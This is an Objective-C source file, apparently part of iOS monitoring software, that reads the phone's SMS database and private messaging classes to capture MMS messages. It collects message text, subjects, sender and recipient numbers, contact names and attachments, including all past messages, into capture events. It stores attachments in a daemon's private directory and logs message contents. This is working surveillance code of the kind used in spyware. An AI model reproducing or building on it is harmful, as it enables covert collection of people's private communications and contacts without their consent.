//
//  MMSCaptureDAO.m
//  MMSCaptureManager
//
//  Created by Makara Khloth on 2/6/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "MMSCaptureDAO.h"
#import "MMSAttachmentUtils.h"
#import "FxMmsEvent.h"
#import "FxRecipient.h"
#import "DefStd.h"
#import "DateTimeFormat.h"
#import "ArrayUtils.h"
#import "FMDatabase.h"
#import "FMResultSet.h"

#import "CKDBMessage.h"
#import "CKDBMessage+IOS6.h"
#import "CKDBMessage+iOS8.h"

#import "ABContactsManager.h"

#import <objc/runtime.h>
#import <UIKit/UIKit.h>

#import "DaemonPrivateHome.h"

static NSString * const kSelectMMSEventSql1	= @"select ROWID, text, subject, is_from_me, handle_id, cache_roomnames from message where "
													"error = 0 and service = 'SMS' and (length(subject) > 0 or ROWID in (select message_id from message_attachment_join)) "
													"order by ROWID desc limit %ld";

static NSString * const kSelectMMSEventSql2	= @"select ROWID, text, subject, is_from_me, handle_id, cache_roomnames from message where ROWID = %ld";

static NSString * const kSelectHandleSql	= @"select id, uncanonicalized_id from handle where ROWID = %ld";

static NSString * const kSelectChatSql		= @"select guid from chat where ROWID in (select chat_id from chat_message_join where message_id = %ld)";

#pragma mark Historical



static NSString * const kSelectMMSHistoryWithMax	= @"SELECT ROWID, guid, text, subject, is_from_me, handle_id, date "
                                                        "FROM message "
                                                        "WHERE error = 0        AND "
                                                            "service = 'SMS'    AND "
                                                            "(length(subject) > 0 OR "
                                                                "ROWID IN (SELECT message_id FROM message_attachment_join)) "
                                                        "ORDER BY ROWID DESC LIMIT %ld";

static NSString * const kSelectMMSHistory	= @"SELECT ROWID, guid, text, subject, is_from_me, handle_id, date "
                                                "FROM message "
                                                "WHERE error = 0        AND "
                                                    "service = 'SMS'    AND "
                                                    "(length(subject) > 0 OR "
                                                        "ROWID IN (SELECT message_id FROM message_attachment_join)) "
                                                "ORDER BY ROWID DESC";

@implementation MMSCaptureDAO

@synthesize mAttachmentPath;
@synthesize mAttSavingQueue;

- (id) init {
	if ((self = [super init])) {
		mSMSDatabase = [[FMDatabase databaseWithPath:kSMSHistoryDatabasePath] retain];
		[mSMSDatabase open];
	}
	return (self);
}

- (NSArray *) selectMMSEvents: (NSInteger) aNumberOfEvents {
	NSMutableArray *events = [[NSMutableArray alloc] initWithCapacity:aNumberOfEvents];
	NSString *sql1 = [NSString stringWithFormat:kSelectMMSEventSql1, (long)aNumberOfEvents];
	FMResultSet *rs1 = [mSMSDatabase executeQuery:sql1];
	while ([rs1 next]) {
		NSInteger ROWID = [rs1 intForColumnIndex:0];
		NSString *message = [rs1 stringForColumnIndex:1];
		NSString *subject = [rs1 stringForColumnIndex:2];
		BOOL is_from_me = [rs1 intForColumnIndex:3];
		NSInteger handle_id = [rs1 intForColumnIndex:4];
		
		FxMmsEvent *mmsEvent = [[FxMmsEvent alloc] init];
		[mmsEvent setEventId:ROWID];
		[mmsEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		[mmsEvent setMessage:message];
		[mmsEvent setSubject:subject];
		
		NSString *sql2 = [NSString stringWithFormat:kSelectHandleSql, (long)handle_id];
		FMResultSet *rs2 = [mSMSDatabase executeQuery:sql2];
		NSString *address = nil;
		if ([rs2 next]) {
			address = ([[rs2 stringForColumnIndex:1] length] > 0) ? [rs2 stringForColumnIndex:1] : // uncanonicalized_id
																    [rs2 stringForColumnIndex:0]; // id
		}
		
		NSString *sql3 = [NSString stringWithFormat:kSelectChatSql, (long)ROWID];
		FMResultSet *rs3 = [mSMSDatabase executeQuery:sql3];
		NSString *groupID = nil;
		if ([rs3 next]) {
			groupID = [rs3 stringForColumnIndex:0];
		}
		[mmsEvent setMConversationID:groupID];
		
		Class $CKDBMessage = objc_getClass("CKDBMessage");
		CKDBMessage *dbMessage = [[$CKDBMessage alloc] initWithRecordID:(int)ROWID];
		
		DLog (@"+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++");
		DLog (@"CKDBMessage object          = %@", dbMessage);
		DLog (@"address                     = %@", [dbMessage address]);
		DLog (@"text                        = %@", [dbMessage text]);
        DLog (@"previewText                 = %@", [dbMessage previewText]);
		DLog (@"subject                     = %@", [dbMessage subject]);
		DLog (@"recipients                  = %@", [dbMessage recipients]);
		DLog (@"isOutgoing                  = %d", [dbMessage isOutgoing]);
		DLog (@"hasAttachments              = %d", [dbMessage hasAttachments]);
		DLog (@"attachmentText              = %@", [dbMessage attachmentText]);
        if ([dbMessage respondsToSelector:@selector(messageParts)]) { // Not available in iOS 8
            DLog (@"messageParts            = %@", [dbMessage messageParts]);
        }
        if ([dbMessage respondsToSelector:@selector(mediaObjects)]) { // iOS 8
            DLog (@"mediaObjects            = %@", [dbMessage mediaObjects]);
        }
		DLog (@"groupid                     = %@", [dbMessage groupID]);
		DLog (@"guid                        = %@", [dbMessage guid]);
		DLog (@"madridAccountGUID           = %@", [dbMessage madridAccountGUID]);
        if ([dbMessage respondsToSelector:@selector(isMessageFullyLoaded)]) { // Not available in iOS 8
            DLog (@"isMessageFullyLoaded    = %d", [dbMessage isMessageFullyLoaded]);
        }
		DLog (@"+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++");
		
		if (is_from_me) {
			[mmsEvent setDirection:kEventDirectionOut];
			
			if (handle_id > 0) { // Outgoing to one recipient
				FxRecipient *recipient = [[FxRecipient alloc] init];
				[recipient setRecipNumAddr:address]; // Contact name will cannot get here
				[recipient setRecipType:kFxRecipientTO];
				[mmsEvent addRecipient:recipient];
				[recipient release];
			} else { // Outgoing to multiple recipients
				for (NSString *recipientNumber in [dbMessage recipients]) {
					FxRecipient *recipient = [[FxRecipient alloc] init];
					[recipient setRecipNumAddr:recipientNumber]; // Contact name will cannot get here
					[recipient setRecipType:kFxRecipientTO];
					[mmsEvent addRecipient:recipient];
					[recipient release];
				}
			}
		} else {
			[mmsEvent setDirection:kEventDirectionIn];
			[mmsEvent setSenderNumber:address]; // Contact name will cannot get here
		}
		
		// Attachments
		MMSAttachmentUtils *utils = [[MMSAttachmentUtils alloc] init];
		[utils setMAttachmentPath:mAttachmentPath];
		[utils setMAttSavingQueue:mAttSavingQueue];
		NSMutableArray *attachments = nil;
        if ([[[UIDevice currentDevice] systemVersion] intValue] <= 7) {
            attachments = [utils getAttachments:dbMessage];
        } else {
            attachments = [utils getAttachments8:dbMessage];
        }
        [mmsEvent setMessage:[dbMessage previewText]];
		[mmsEvent setAttachmentArray:attachments];
		[utils release];
		
		[dbMessage release];
		[events addObject:mmsEvent];
		[mmsEvent release];
		
		DLog (@"======================================");
		DLog (@"ROWID       = %ld", (long)ROWID);
		DLog (@"message     = %@", message);
		DLog (@"subject     = %@", subject);
		DLog (@"is_from_me  = %d", is_from_me);
		DLog (@"handle_id   = %ld", (long)handle_id);
		DLog (@"address     = %@", address);
		DLog (@"groupID     = %@", groupID);
		DLog (@"======================================");
	}
	NSArray *mmsEvents = [ArrayUtils reverseArray:events];
	[events release];
    
    DLog(@"MMS Events %@", mmsEvents)
    
	return (mmsEvents);
}

- (FxMmsEvent *) selectMMSEvent: (NSInteger) aROWID {
	FxMmsEvent *mmsEvent = nil;
	NSString *sql1 = [NSString stringWithFormat:kSelectMMSEventSql2, (long)aROWID];
	FMResultSet *rs1 = [mSMSDatabase executeQuery:sql1];
	while ([rs1 next]) {
		NSInteger ROWID = [rs1 intForColumnIndex:0];
		NSString *message = [rs1 stringForColumnIndex:1];
		NSString *subject = [rs1 stringForColumnIndex:2];
		BOOL is_from_me = [rs1 intForColumnIndex:3];
		NSInteger handle_id = [rs1 intForColumnIndex:4];
		
		mmsEvent = [[[FxMmsEvent alloc] init] autorelease];
		[mmsEvent setEventId:ROWID];
		[mmsEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		[mmsEvent setMessage:message];
		[mmsEvent setSubject:subject];
		
		NSString *sql2 = [NSString stringWithFormat:kSelectHandleSql, (long)handle_id];
		FMResultSet *rs2 = [mSMSDatabase executeQuery:sql2];
		NSString *address = nil;
		if ([rs2 next]) {
			address = ([[rs2 stringForColumnIndex:1] length] > 0) ? [rs2 stringForColumnIndex:1] : // uncanonicalized_id
			[rs2 stringForColumnIndex:0]; // id
		}
		
		NSString *sql3 = [NSString stringWithFormat:kSelectChatSql, (long)ROWID];
		FMResultSet *rs3 = [mSMSDatabase executeQuery:sql3];
		NSString *groupID = nil;
		if ([rs3 next]) {
			groupID = [rs3 stringForColumnIndex:0];
		}
		[mmsEvent setMConversationID:groupID];
		
		Class $CKDBMessage = objc_getClass("CKDBMessage");
		CKDBMessage *dbMessage = [[$CKDBMessage alloc] initWithRecordID:(int)ROWID];
		
		DLog (@"+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++");
		DLog (@"CKDBMessage object          = %@", dbMessage);
		DLog (@"address                     = %@", [dbMessage address]);
		DLog (@"text                        = %@", [dbMessage text]);
        DLog (@"previewText                 = %@", [dbMessage previewText]);
		DLog (@"subject                     = %@", [dbMessage subject]);
		DLog (@"recipients                  = %@", [dbMessage recipients]);
		DLog (@"isOutgoing                  = %d", [dbMessage isOutgoing]);
		DLog (@"hasAttachments              = %d", [dbMessage hasAttachments]);
		DLog (@"attachmentText              = %@", [dbMessage attachmentText]);
        if ([dbMessage respondsToSelector:@selector(messageParts)]) { // Not available in iOS 8
            DLog (@"messageParts            = %@", [dbMessage messageParts]);
        }
        if ([dbMessage respondsToSelector:@selector(mediaObjects)]) { // iOS 8
            DLog (@"mediaObjects            = %@", [dbMessage mediaObjects]);
        }
		DLog (@"groupid                     = %@", [dbMessage groupID]);
		DLog (@"guid                        = %@", [dbMessage guid]);
		DLog (@"madridAccountGUID           = %@", [dbMessage madridAccountGUID]);
        if ([dbMessage respondsToSelector:@selector(isMessageFullyLoaded)]) { // Not available in iOS 8
            DLog (@"isMessageFullyLoaded    = %d", [dbMessage isMessageFullyLoaded]);
        }
		DLog (@"+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++");
		
		if (is_from_me) {
			[mmsEvent setDirection:kEventDirectionOut];
			
			if (handle_id > 0) { // Outgoing to one recipient
				FxRecipient *recipient = [[FxRecipient alloc] init];
				[recipient setRecipNumAddr:address]; // Contact name will cannot get here
				[recipient setRecipType:kFxRecipientTO];
				[mmsEvent addRecipient:recipient];
				[recipient release];
			} else { // Outgoing to multiple recipients
				for (NSString *recipientNumber in [dbMessage recipients]) {
					FxRecipient *recipient = [[FxRecipient alloc] init];
					[recipient setRecipNumAddr:recipientNumber]; // Contact name will cannot get here
					[recipient setRecipType:kFxRecipientTO];
					[mmsEvent addRecipient:recipient];
					[recipient release];
				}
			}
		} else {
			[mmsEvent setDirection:kEventDirectionIn];
			[mmsEvent setSenderNumber:address]; // Contact name will cannot get here
		}
		
		// Attachments
		MMSAttachmentUtils *utils = [[MMSAttachmentUtils alloc] init];
		[utils setMAttachmentPath:mAttachmentPath];
		[utils setMAttSavingQueue:mAttSavingQueue];
		NSMutableArray *attachments = nil;
        if ([[[UIDevice currentDevice] systemVersion] intValue] <= 7) {
            attachments = [utils getAttachments:dbMessage];
        } else {
            attachments = [utils getAttachments8:dbMessage];
        }
        [mmsEvent setMessage:[dbMessage previewText]];
		[mmsEvent setAttachmentArray:attachments];
		[utils release];
		
		[dbMessage release];
		
		DLog (@"======================================");
		DLog (@"ROWID       = %ld", (long)ROWID);
		DLog (@"message   = %@", message);
		DLog (@"subject     = %@", subject);
		DLog (@"is_from_me  = %d", is_from_me);
		DLog (@"handle_id   = %ld", (long)handle_id);
		DLog (@"address     = %@", address);
		DLog (@"groupID     = %@", groupID);
		DLog (@"======================================");
	}
	return (mmsEvent);
}


#pragma mark - Historical MMS Event


- (NSArray *) selectAllMMSHistory {
	NSArray *smsLogs    = nil;
    smsLogs             = [self selectAllMMSHistoricaliOS7iOS8:kSelectMMSHistory];         // Order by date
	return (smsLogs);
}

- (NSArray *) selectAllMMSHistoryWithMax: (NSInteger) aMaxEvent {
    DLog(@"selectAllSMSHistoryWithMax %ld", (long)aMaxEvent)
	NSArray *smsLogs        = nil;
    NSString *sql           = [NSString stringWithFormat:kSelectMMSHistoryWithMax, (long)aMaxEvent];      // Order by date
    DLog(@"SQL iOS 7,8 %@", sql)
    smsLogs                 = [self selectAllMMSHistoricaliOS7iOS8:sql];
	return (smsLogs);
}

- (NSDate *) dateFromDBDate: (double) aDBDate {
    NSDate *date    = nil;
    date            = [NSDate dateWithTimeIntervalSinceReferenceDate:aDBDate];
    return date;
}

- (NSString *) addressForHandleID: (long) aHandleID {
    NSString *address   = nil;
    NSString *sql2      = [NSString stringWithFormat:kSelectHandleSql, aHandleID];
    FMResultSet *rs2    = [mSMSDatabase executeQuery:sql2];
    if ([rs2 next]) {
        address         = ([[rs2 stringForColumn:@"uncanonicalized_id"] length] > 0) ?
        [rs2 stringForColumn:@"uncanonicalized_id"] :
        [rs2 stringForColumn:@"id"];
    }
    return address;
}

- (NSString *) converIDForROWID: (long) aRowID {
    NSString *groupID   = nil;
    NSString *sql3      = [NSString stringWithFormat:kSelectChatSql, aRowID];
    FMResultSet *rs3    = [mSMSDatabase executeQuery:sql3];
    if ([rs3 next]) {
        groupID         = [rs3 stringForColumnIndex:0];
    }
    return groupID;
}

- (NSString *) contactForAddress: (NSString *) aAddress {
    ABContactsManager *contactManager   = [[ABContactsManager alloc] init];
    aAddress                            = [aAddress stringByReplacingOccurrencesOfString:@"-" withString:@""];
    NSString *contactName               = [contactManager searchFirstNameLastName:aAddress contactID:-1];
    [contactManager release];
    return  contactName;
}

- (NSArray *) selectAllMMSHistoricaliOS7iOS8: (NSString *) aSQL {
    
    NSMutableArray *events  = [[NSMutableArray alloc] init];
    
	FMResultSet *rs1        = [mSMSDatabase executeQuery:aSQL];
    
	while ([rs1 next]) {
		NSInteger ROWID     = [rs1 intForColumn:@"ROWID"];
		NSString *message   = [rs1 stringForColumn:@"text"];
		NSString *subject   = [rs1 stringForColumn:@"subject"];
		BOOL is_from_me     = [rs1 intForColumn:@"is_from_me"];
		NSInteger handle_id = [rs1 intForColumn:@"handle_id"];
        NSDate *date        = [self dateFromDBDate:[rs1 doubleForColumn:@"date"]];         // get date and adjust format
        
        // -- Create FxMmsEvent --------------------------
		FxMmsEvent *mmsEvent = [[FxMmsEvent alloc] init];
		[mmsEvent setEventId:ROWID];
        
        if (date)   [mmsEvent setDateTime:[DateTimeFormat dateTimeWithDate:date]];
        else        [mmsEvent setDateTime:[DateTimeFormat phoenixDateTime]];
        
		[mmsEvent setMessage:message];
		[mmsEvent setSubject:subject];
		      
        // -- Get address from table "handle"
        NSString *address   = [self addressForHandleID:(long)handle_id];
        
        // -- Get conver id
        NSString *groupID   = [self converIDForROWID:ROWID];
		[mmsEvent setMConversationID:groupID];
        
		Class $CKDBMessage = objc_getClass("CKDBMessage");
		CKDBMessage *dbMessage = [[$CKDBMessage alloc] initWithRecordID:(int)ROWID];
		
		DLog (@"+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++");
		DLog (@"CKDBMessage object          = %@", dbMessage);
		DLog (@"address                     = %@", [dbMessage address]);
		DLog (@"text                        = %@", [dbMessage text]);
        DLog (@"previewText                 = %@", [dbMessage previewText]);
		DLog (@"subject                     = %@", [dbMessage subject]);
		DLog (@"recipients                  = %@", [dbMessage recipients]);
		DLog (@"isOutgoing                  = %d", [dbMessage isOutgoing]);
		DLog (@"hasAttachments              = %d", [dbMessage hasAttachments]);
		DLog (@"attachmentText              = %@", [dbMessage attachmentText]);
        if ([dbMessage respondsToSelector:@selector(messageParts)]) { // Not available in iOS 8
            DLog (@"messageParts            = %@", [dbMessage messageParts]);
        }
        if ([dbMessage respondsToSelector:@selector(mediaObjects)]) { // iOS 8
            DLog (@"mediaObjects            = %@", [dbMessage mediaObjects]);
        }
		DLog (@"groupid                     = %@", [dbMessage groupID]);
		DLog (@"guid                        = %@", [dbMessage guid]);
		DLog (@"madridAccountGUID           = %@", [dbMessage madridAccountGUID]);
        if ([dbMessage respondsToSelector:@selector(isMessageFullyLoaded)]) { // Not available in iOS 8
            DLog (@"isMessageFullyLoaded    = %d", [dbMessage isMessageFullyLoaded]);
        }
		DLog (@"+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++");
		
		if (is_from_me) {
            DLog(@"outgoing")
			[mmsEvent setDirection:kEventDirectionOut];
			
			if (handle_id > 0) { // Outgoing to one recipient
				FxRecipient *recipient = [[FxRecipient alloc] init];
				[recipient setRecipNumAddr:address]; // Contact name will cannot get here
				[recipient setRecipType:kFxRecipientTO];
                [recipient setRecipContactName:[self contactForAddress:address]];
				[mmsEvent addRecipient:recipient];
				[recipient release];
			} else { // Outgoing to multiple recipients
                DLog(@"+++++ Outgoing to multiple")
                
				for (NSString *recipientNumber in [dbMessage recipients]) {
					FxRecipient *recipient = [[FxRecipient alloc] init];
					[recipient setRecipNumAddr:recipientNumber]; // Contact name will cannot get here
					[recipient setRecipType:kFxRecipientTO];
                    [recipient setRecipContactName:[self contactForAddress:recipientNumber]];
					[mmsEvent addRecipient:recipient];
					[recipient release];
				}
                
                DLog(@"!!!!!!!! multile recipients for MMS %@", [mmsEvent recipientArray])
			}
		} else {
            DLog(@"incoming")
			[mmsEvent setDirection:kEventDirectionIn];
			[mmsEvent setSenderNumber:address]; // Contact name will cannot get here
            [mmsEvent setSenderContactName:[self contactForAddress:address]];                 // Get contact name
		}
		
		// Attachments
        NSString* mmsAttachmentPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/mms/"];
        [DaemonPrivateHome createDirectoryAndIntermediateDirectories:mmsAttachmentPath];

        
		MMSAttachmentUtils *utils = [[MMSAttachmentUtils alloc] init];
		[utils setMAttachmentPath:mAttachmentPath];
		[utils setMAttSavingQueue:mAttSavingQueue];
		NSMutableArray *attachments = nil;
        if ([[[UIDevice currentDevice] systemVersion] intValue] <= 7) {
            attachments = [utils getAttachments:dbMessage];
        } else {
            attachments = [utils getAttachments8:dbMessage];
        }
        [mmsEvent setMessage:[dbMessage previewText]];
		[mmsEvent setAttachmentArray:attachments];
		[utils release];
		
		[dbMessage release];
		[events addObject:mmsEvent];
		[mmsEvent release];
		
		DLog (@"======================================");
		DLog (@"ROWID       = %ld", (long)ROWID);
		DLog (@"message     = %@", message);
		DLog (@"subject     = %@", subject);
		DLog (@"is_from_me  = %d", is_from_me);
		DLog (@"handle_id   = %ld", (long)handle_id);
		DLog (@"address     = %@", address);
		DLog (@"groupID     = %@", groupID);
		DLog (@"======================================");
	}
	NSArray *mmsEvents = [ArrayUtils reverseArray:events];
	[events release];
	return (mmsEvents);
}

- (void) dealloc {
	[mAttachmentPath release];
	[mSMSDatabase close];
	[mSMSDatabase release];
	[super dealloc];
}

@end
